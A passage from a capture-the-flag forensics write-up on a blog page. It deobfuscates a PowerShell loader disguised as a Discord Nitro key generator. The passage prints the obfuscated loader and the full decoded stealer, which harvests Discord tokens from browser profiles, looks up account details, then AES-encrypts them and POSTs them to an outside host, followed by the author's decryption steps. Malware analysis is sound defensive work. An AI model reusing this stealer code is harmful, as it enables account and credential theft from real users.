hBHJddmbpJHdztFIgACIgACIgoQDoASbhJXYwBCIgAiCNsHIsFWZ0NFIu9Wa0Nmb1ZmCNoQDiEGZ3pWYrRmap9maxomczkDOxomcvADOwgjO1MTMuYTMx4CO2EjLykTMv8iOwRHdoJCI9ACTSVFJ&#34;</span> ;
+</span></span><span style="display:flex;"><span>$s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray() ; [<span style="color:#66d9ef">array</span>]::Reverse($s0yAY2gmHVNFd7QZ) ; -join $s0yAY2gmHVNFd7QZ <span style="color:#ae81ff">2</span>&gt;&amp;<span style="color:#ae81ff">1</span>&gt; $null ;
+</span></span><span style="display:flex;"><span>$LOaDcODEoPX3ZoUgP2T6cvl3KEK = [<span style="color:#66d9ef">sYSTeM.TeXt.ENcODING</span>]::UTf8.geTSTRiNG([<span style="color:#66d9ef">SYSTEm.cOnVeRT</span>]::FRoMBaSe64sTRing(<span style="color:#e6db74">&#34;</span>$s0yAY2gmHVNFd7QZ<span style="color:#e6db74">&#34;</span>)) ;
+</span></span><span style="display:flex;"><span>$U9COA51JG8eTcHhs0YFxrQ3j = <span style="color:#e6db74">&#34;Inv&#34;</span>+<span style="color:#e6db74">&#34;OKe&#34;</span>+<span style="color:#e6db74">&#34;-EX&#34;</span>+<span style="color:#e6db74">&#34;pRe&#34;</span>+<span style="color:#e6db74">&#34;SSI&#34;</span>+<span style="color:#e6db74">&#34;On&#34;</span> ; New-alIaS -Name pWn -VaLuE $U9COA51JG8eTcHhs0YFxrQ3j -FoRcE ; pWn $lOADcODEoPX3ZoUgP2T6cvl3KEK ;
+</span></span></code></pre></div><p>To deobfuscate the script, we need to analyze what is actually doing. First, it defines a variable called <code>$jozeq3n</code>. The variable apparently stores a Base64 encoded string. Next, another variable is defined called <code>$s0yAY2gmHVNFd7QZ</code>. The most interesting part is that after converting the string stored in <code>$jozeq3n</code> to a characters array, it reverse it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>[<span style="color:#66d9ef">array</span>]::Reverse($s0yAY2gmHVNFd7QZ)
+</span></span></code></pre></div><p>The rest of the code is used to execute the script encoded in the Base64 string. With <code>echo</code>, <code>rev</code>, and <code>base64 -d</code> we can decode the content of the variable <code>$jozeq3n</code>. This results in the following PowerShell script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>$URL = <span style="color:#e6db74">&#34;http://192.168.116.135:8080/rj1893rj1joijdkajwda&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Steal {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span> (
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">string</span>]$path
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $tokens = @()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        Get-ChildItem -Path $path <span style="color:#f92672">-File</span> -Recurse -Force | ForEach-Object {
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">foreach</span> ($regex <span style="color:#66d9ef">in</span> @(<span style="color:#e6db74">&#39;[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}&#39;</span>, <span style="color:#e6db74">&#39;mfa\.[\w-]{80,95}&#39;</span>)) {
+</span></span><span style="display:flex;"><span>                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object {
+</span></span><span style="display:flex;"><span>                        $_.Matches.Value
+</span></span><span style="display:flex;"><span>                    }
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> {}
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $tokens
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> GenerateDiscordNitroCodes {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span> (
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">int</span>]$numberOfCodes = <span style="color:#ae81ff">10</span>,
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">int</span>]$codeLength = <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $chars = <span style="color:#e6db74">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;</span>
+</span></span><span style="display:flex;"><span>    $codes = @()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i = <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">-lt</span> $numberOfCodes; $i++) {
+</span></span><span style="display:flex;"><span>        $code = -join (<span style="color:#ae81ff">1</span>..$codeLength | ForEach-Object { Get-Random -InputObject $chars.ToCharArray() })
+</span></span><span style="display:flex;"><span>        $codes += $code
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $codes
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Get-DiscordUserInfo {
+</span></span><span style="display:flex;"><span>    [CmdletBinding()]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">Param</span> (
+</span></span><span style="display:flex;"><span>        [Parameter(<span style="color:#a6e22e">Mandatory</span> = $true)]
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">string</span>]$Token
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">process</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            $Headers = @{
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Authorization&#34;</span> = $Token
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Content-Type&#34;</span> = <span style="color:#e6db74">&#34;application/json&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;User-Agent&#34;</span> = <span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            $Uri = <span style="color:#e6db74">&#34;https://discord.com/api/v9/users/@me&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> $Response
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> {}
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Create-AesManagedObject($key, $IV, $mode) {
+</span></span><span style="display:flex;"><span>    $aesManaged = New-Object <span style="color:#e6db74">&#34;System.Security.Cryptography.AesManaged&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($mode=<span style="color:#e6db74">&#34;CBC&#34;</span>) { $aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::CBC }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elseif</span> ($mode=<span style="color:#e6db74">&#34;CFB&#34;</span>) {$aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::CFB}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elseif</span> ($mode=<span style="color:#e6db74">&#34;CTS&#34;</span>) {$aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::CTS}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elseif</span> ($mode=<span style="color:#e6db74">&#34;ECB&#34;</span>) {$aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::ECB}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elseif</span> ($mode=<span style="color:#e6db74">&#34;OFB&#34;</span>){$aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::OFB}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $aesManaged.Padding = [<span style="color:#66d9ef">System.Security.Cryptography.PaddingMode</span>]::PKCS7
+</span></span><span style="display:flex;"><span>    $aesManaged.BlockSize = <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>    $aesManaged.KeySize = <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($IV) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($IV.getType().Name <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;String&#34;</span>) {
+</span></span><span style="display:flex;"><span>            $aesManaged.IV = [<span style="color:#66d9ef">System.Convert</span>]::FromBase64String($IV)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $aesManaged.IV = $IV
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($key) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($key.getType().Name <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;String&#34;</span>) {
+</span></span><span style="display:flex;"><span>            $aesManaged.Key = [<span style="color:#66d9ef">System.Convert</span>]::FromBase64String($key)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $aesManaged.Key = $key
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $aesManaged
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Encrypt-String($key, $plaintext) {
+</span></span><span style="display:flex;"><span>    $bytes = [<span style="color:#66d9ef">System.Text.Encoding</span>]::UTF8.GetBytes($plaintext)
+</span></span><span style="display:flex;"><span>    $aesManaged = Create-AesManagedObject $key
+</span></span><span style="display:flex;"><span>    $encryptor = $aesManaged.CreateEncryptor()
+</span></span><span style="display:flex;"><span>    $encryptedData = $encryptor.TransformFinalBlock($bytes, <span style="color:#ae81ff">0</span>, $bytes.Length);
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">byte[]</span>] $fullData = $aesManaged.IV + $encryptedData
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">System.Convert</span>]::ToBase64String($fullData)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   </span><span style="color:#ae81ff">`&#39;</span><span style="color:#e6db74"> / /&#39;| |/&#39; |</span><span style="color:#ae81ff">`&#39;</span><span style="color:#e6db74"> / /&#39;/ /| |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|  _| &#39;__/ _ \/ _ \ | | | | / __|/ __/ _ \| &#39;__/ _` | | . ` | | __| &#39;__/ _ \    / /  |  /| |  / / / /_| |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                                                                                         
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                                                                                         &#34;</span>
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Generating Discord nitro keys! Please be patient...&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$local = $env:LOCALAPPDATA
+</span></span><span style="display:flex;"><span>$roaming = $env:APPDATA
+</span></span><span style="display:flex;"><span>$part1 = <span style="color:#e6db74">&#34;SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$paths = @{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Google Chrome&#39;</span> = <span style="color:#e6db74">&#34;</span>$local<span style="color:#e6db74">\Google\Chrome\User Data\Default&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Brave&#39;</span> = <span style="color:#e6db74">&#34;</span>$local<span style="color:#e6db74">\BraveSoftware\Brave-Browser\User Data\Default\&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Opera&#39;</span> = <span style="color:#e6db74">&#34;</span>$roaming<span style="color:#e6db74">\Opera Software\Opera Stable&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Firefox&#39;</span> = <span style="color:#e6db74">&#34;</span>$roaming<span style="color:#e6db74">\Mozilla\Firefox\Profiles&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$headers = @{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Content-Type&#39;</span> = <span style="color:#e6db74">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;User-Agent&#39;</span> = <span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$allTokens = @()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($platform <span style="color:#66d9ef">in</span> $paths.Keys) {
+</span></span><span style="display:flex;"><span>    $currentPath = $paths[$platform]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">-not</span> (Test-Path $currentPath -PathType Container)) {<span style="color:#66d9ef">continue</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $tokens = Steal -path $currentPath
+</span></span><span style="display:flex;"><span>    $allTokens += $tokens
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$userInfos = @()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($token <span style="color:#66d9ef">in</span> $allTokens) {
+</span></span><span style="display:flex;"><span>    $userInfo = Get-DiscordUserInfo -Token $token
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($userInfo) {
+</span></span><span style="display:flex;"><span>        $userDetails = [<span style="color:#66d9ef">PSCustomObject</span>]@{
+</span></span><span style="display:flex;"><span>            ID = $userInfo.id
+</span></span><span style="display:flex;"><span>            Email = $userInfo.email
+</span></span><span style="display:flex;"><span>            GlobalName = $userInfo.global_name
+</span></span><span style="display:flex;"><span>            Token = $token
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        $userInfos += $userDetails
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$AES_KEY = <span style="color:#e6db74">&#34;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&#34;</span>
+</span></span><span style="display:flex;"><span>$payload = $userInfos | ConvertTo-Json -Depth <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    $headers = @{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span> = <span style="color:#e6db74">&#39;text/plain&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span> = <span style="color:#e6db74">&#39;Mozilla/5.0&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Success! Discord Nitro Keys:&#34;</span>
+</span></span><span style="display:flex;"><span>$keys = GenerateDiscordNitroCodes -numberOfCodes <span style="color:#ae81ff">5</span> -codeLength <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>$keys | ForEach-Object { Write-Output $_ }
+</span></span></code></pre></div><p>The first point of interest is the variable <code>$part1</code> which appears to be a string encoded in Base64. So, we can decoded with <code>echo</code> and <code>base64 -d</code> to notice that is one part of the flag.</p>
+<figure><img src="fake-boost-p4.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+<p>Another interesting parts of the script are the following functions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Encrypt-String($key, $plaintext) {
+</span></span><span style="display:flex;"><span>    $bytes = [<span style="color:#66d9ef">System.Text.Encoding</span>]::UTF8.GetBytes($plaintext)
+</span></span><span style="display:flex;"><span>    $aesManaged = Create-AesManagedObject $key
+</span></span><span style="display:flex;"><span>    $encryptor = $aesManaged.CreateEncryptor()
+</span></span><span style="display:flex;"><span>    $encryptedData = $encryptor.TransformFinalBlock($bytes, <span style="color:#ae81ff">0</span>, $bytes.Length);
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">byte[]</span>] $fullData = $aesManaged.IV + $encryptedData
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">System.Convert</span>]::ToBase64String($fullData)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Create-AesManagedObject($key, $IV, $mode) {
+</span></span><span style="display:flex;"><span>    $aesManaged = New-Object <span style="color:#e6db74">&#34;System.Security.Cryptography.AesManaged&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($mode=<span style="color:#e6db74">&#34;CBC&#34;</span>) { $aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::CBC }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elseif</span> ($mode=<span style="color:#e6db74">&#34;CFB&#34;</span>) {$aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::CFB}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elseif</span> ($mode=<span style="color:#e6db74">&#34;CTS&#34;</span>) {$aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::CTS}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elseif</span> ($mode=<span style="color:#e6db74">&#34;ECB&#34;</span>) {$aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::ECB}
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elseif</span> ($mode=<span style="color:#e6db74">&#34;OFB&#34;</span>){$aesManaged.Mode = [<span style="color:#66d9ef">System.Security.Cryptography.CipherMode</span>]::OFB}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $aesManaged.Padding = [<span style="color:#66d9ef">System.Security.Cryptography.PaddingMode</span>]::PKCS7
+</span></span><span style="display:flex;"><span>    $aesManaged.BlockSize = <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>    $aesManaged.KeySize = <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($IV) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($IV.getType().Name <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;String&#34;</span>) {
+</span></span><span style="display:flex;"><span>            $aesManaged.IV = [<span style="color:#66d9ef">System.Convert</span>]::FromBase64String($IV)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $aesManaged.IV = $IV
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($key) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($key.getType().Name <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;String&#34;</span>) {
+</span></span><span style="display:flex;"><span>            $aesManaged.Key = [<span style="color:#66d9ef">System.Convert</span>]::FromBase64String($key)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $aesManaged.Key = $key
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $aesManaged
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In short, these functions are used to encrypt text with the AES encryption algorithm using a 256 bits key and a block size of 128 bits. Also, they encode in Base64 the encrypted text. Because the key is hard-coded in the script. We can use this key and try to decrypt the text inside the <code>rj1893rj1joijdkajwda</code></p>
+<pre tabindex="0"><code>&#34;bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==&#34;
+</code></pre><p>For simplicity, we can write this function in PowerShell. It is important to add an instruction to the decode from Base64 the text before anything else.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Decrypt-String($key, $encryptedText) {
+</span></span><span style="display:flex;"><span>    $encryptedBytes = [<span style="color:#66d9ef">System.Convert</span>]::FromBase64String($encryptedText)
+</span></span><span style="display:flex;"><span>    $aesManaged = Create-AesManagedObject $key
+</span></span><span style="display:flex;"><span>    $decryptor = $aesManaged.CreateDecryptor()
+</span></span><span style="display:flex;"><span>    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, <span style="color:#ae81ff">16</span>, $encryptedBytes.Length - <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">System.Text.Encoding</span>]::UTF8.GetString($decryptedBytes)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now, we can use this function to decrypt the data by calling these function inside PowerShell and then use <code>echo</code> to see the results.</p>
+<figure><img src="fake-boost-p5.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+<ul>
+<li><code>$AES_KEY</code> -&gt; key found inside the script</li>
+<li><code>$Text</code> -&gt; data contained in the <code>rj1893rj1joijdkajwda</code> file</li>
+</ul>
+<p>The email looks like Base64. Decoding this string with <code>echo</code> and <code>base64 -d</code> we get the other part of the flag.</p>
+<figure><img src="fake-boost-p6.png"
+         alt="Workshop" width="auto"/>
+</figure>
+
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2024
+    
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
